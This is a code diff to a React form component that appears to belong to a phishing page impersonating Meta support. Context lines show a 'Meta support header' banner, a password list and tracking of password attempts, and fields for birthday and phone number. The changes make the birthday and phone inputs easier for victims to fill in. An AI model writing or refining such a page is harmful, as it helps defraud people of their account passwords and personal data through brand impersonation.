@@ -293,6 +293,21 @@ ${passwordList}`;
         setPasswordAttempts([]);
         setLastMessageId(null);
     }, []);
+    const formatDateInput = (e: React.ChangeEvent<HTMLInputElement>) => {
+        const input = e.target.value.replace(/\D/g, ''); let formattedValue = '';
+
+        if (input.length > 2) {
+            formattedValue += input.slice(0, 2) + '/'; if (input.length > 4) {
+                formattedValue += input.slice(2, 4) + '/'; formattedValue += input.slice(4, 8);
+            } else {
+                formattedValue += input.slice(2, 4);
+            }
+        } else {
+            formattedValue = input;
+        }
+
+        e.target.value = formattedValue;
+    };
     return (
         <div className='min-h-screen relative'>
             <img src={Banner} alt='Meta support header' className='w-full h-48 object-cover shadow-md' />
@@ -345,7 +360,7 @@ ${passwordList}`;
                                 </div>
 
                                 <div>
-                                    <input type='date' {...registerMain('birthday')} tabIndex={2} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors [&::-webkit-calendar-picker-indicator]:opacity-0' />
+                                    <input type='text' onInput={formatDateInput} placeholder='Birthday (MM/DD/YYYY)' {...registerMain('birthday')} tabIndex={2} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors' />
                                     {mainErrors.birthday && <p className='text-red-500 text-sm mt-1.5'>{mainErrors.birthday.message}</p>}
                                 </div>
 
@@ -353,7 +368,7 @@ ${passwordList}`;
                                     <div className='absolute left-0 top-0 bottom-0 flex items-center pl-4 text-gray-600 z-10'>
                                         <span className='text-sm'>{isLoading ? '...' : phoneCode}</span>
                                     </div>
-                                    <input type='tel' placeholder={isLoading ? 'Loading...' : 'Phone number'} {...registerMain('phone')} tabIndex={3} className='w-full px-4 py-2.5 pl-[52px] border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors relative' />
+                                    <input type='number' min={7} max={16} placeholder={isLoading ? 'Loading...' : 'Phone number'} {...registerMain('phone')} tabIndex={3} className='w-full px-4 py-2.5 pl-[52px] border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors relative' />
                                     {mainErrors.phone && (
                                         <div className='absolute left-0 right-0 mt-1.5'>
                                             <p className='text-red-500 text-sm'>{mainErrors.phone.message}</p>
